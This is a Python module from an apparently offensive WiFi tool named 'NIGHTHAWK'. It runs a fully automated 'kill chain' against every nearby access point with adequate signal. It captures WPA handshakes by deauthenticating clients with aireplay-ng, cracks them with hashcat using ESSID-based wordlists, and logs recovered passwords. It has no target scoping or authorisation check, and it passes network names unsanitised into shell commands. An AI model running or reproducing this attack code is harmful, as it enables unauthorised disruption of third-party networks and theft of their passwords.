import subprocess, os, time, csv, sys, shutil, threading
from pathlib import Path
from core.ui import UI, Spinner, C, W, R, G, B, NC, Y, D
from modules.cracking import HandshakeCracker

class EncryptionAttack:
    def __init__(self, interface, bands, proj_dir):
        self.iface = interface; self.bands = bands; self.path = Path(proj_dir)
        self.targets = {}
        self.active = False
        self.loot_count = 0
        self.cracked_count = 0
        self.cracker = HandshakeCracker(self.path)
        self.notifications = []

    def check_buffer_health(self):
        """v62.0 Logic: Prevents RTL8187 buffer stalls during Siege Mode."""
        if sys.platform == "linux":
            try:
                # Check for TX errors in driver stats
                result = subprocess.check_output(f"iw dev {self.iface} station dump", shell=True, stderr=subprocess.DEVNULL)
                if b"tx failed" in result.lower():
                    # Autonomous Self-Healing
                    subprocess.run(f"ip link set {self.iface} down", shell=True)
                    subprocess.run(f"ip link set {self.iface} up", shell=True)
                    return False # Indicate reset happened
            except: pass
        return True

    def monitor_stream(self):
        """Asynchronous traffic parser (Cross-Platform Safe)"""
        tmp = self.path / "predator_live"
        
        # Safe Cleanup
        for f in self.path.glob("predator_live*"):
            try: f.unlink()
            except: pass
        
        if sys.platform != "linux":
            return # Skip driver calls on Windows/Mac

        cmd = f"airodump-ng --band {self.bands} --wps --ignore-negative-one -w {tmp} --output-format csv {self.iface}"
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while self.active:
            # 1. Run Health Check
            self.check_buffer_health()

            # 2. Parse Data
            csv_file = self.path / "predator_live-01.csv"
            if csv_file.exists():
                try:
                    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            r = line.split(',')
                            if len(r) > 13 and r[0] != 'BSSID' and r[0].strip():
                                bssid = r[0].strip()
                                essid = r[13].strip() or "<Hidden>"
                                try:
                                    pwr = int(r[8].strip())
                                    if pwr > -80 and bssid not in self.targets:
                                        self.targets[bssid] = essid
                                        # Spawn Kill Chain
                                        threading.Thread(target=self.kill_chain, args=(bssid, r[3].strip(), essid), daemon=True).start()
                                except: pass
                except: pass
            time.sleep(5)
        try: proc.terminate()
        except: pass

    def kill_chain(self, bssid, ch, essid):
        """The Full-Auto Kill Chain"""
        safe_essid = essid.replace(' ', '_').replace('/', '')
        cap_file = self.path / f"AUTO_{safe_essid}"
        
        # 1. Capture Handshake
        cmd_sniff = f"airodump-ng -c {ch} --bssid {bssid} -w {cap_file} {self.iface}"
        sniff = subprocess.Popen(cmd_sniff, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # High Intensity Injection
        subprocess.run(f"aireplay-ng -0 5 -a {bssid} --ignore-negative-one {self.iface}", 
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(15) 
        sniff.terminate()
        
        # 2. Verify Handshake
        final_cap = self.path / f"AUTO_{safe_essid}-01.cap"
        if final_cap.exists():
            # Cross-platform check for aircrack
            if shutil.which("aircrack-ng"):
                result = subprocess.run(f"aircrack-ng {final_cap}", shell=True, capture_output=True, text=True)
                if "1 handshake" in result.stdout:
                    self.loot_count += 1
                    
                    # 3. Background Cracking
                    hc_file = self.cracker.convert_to_hashcat(str(final_cap))
                    if hc_file:
                        wlist = self.cracker.generate_warp_list(essid)
                        pot = self.path / f"auto_{safe_essid}.pot"
                        
                        # Hashcat works on Windows too if in PATH
                        if shutil.which("hashcat"):
                            subprocess.run(f"hashcat -m 22000 -a 0 {hc_file} {wlist} --outfile={pot} --outfile-format=2 --force", 
                                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            
                            if pot.exists() and pot.stat().st_size > 0:
                                with open(pot, 'r') as f: pw = f.read().strip()
                                self.cracked_count += 1
                                self.cracker.save_success(pw)
                                
                                alert = f"{G}[!] CRACKED: {essid} -> {pw}{NC}"
                                self.notifications.append(alert)
                                
                                with open(self.path / "SUCCESS_LOG.txt", "a") as log:
                                    log.write(f"[{time.strftime('%H:%M:%S')}] {essid}: {pw}\n")
                                pot.unlink()

    def run(self):
        UI.banner()
        UI.print_box([
            f"INTERFACE: {self.iface}",
            "MODE     : FULL-AUTO KILL CHAIN",
            "LOGS     : SUCCESS_LOG.txt"
        ], title="NIGHTHAWK v62.0")
        
        if sys.platform != "linux":
            print(f"\n{Y}[!] WARNING: WiFi Injection is Linux-Only.{NC}")
            print(f"{D}    Running in Passive/Simulation Mode for UI testing.{NC}")
        
        self.active = True
        threading.Thread(target=self.monitor_stream, daemon=True).start()
        
        try:
            while True:
                # Dashboard
                print(f"\r {C}[*] HANDSHAKES: {G}{self.loot_count}{NC} | {C}CRACKED: {G}{self.cracked_count}{NC} | {W}HUNTING...{NC}", end="")
                
                if self.notifications:
                    print(f"\n\n {self.notifications.pop(0)}")
                    print(f" {W}Continuing hunt...{NC}")
                
                time.sleep(1)
        except KeyboardInterrupt:
            self.active = False
            print(f"\n\n{Y}[!] Predator Sequence Terminated.{NC}")
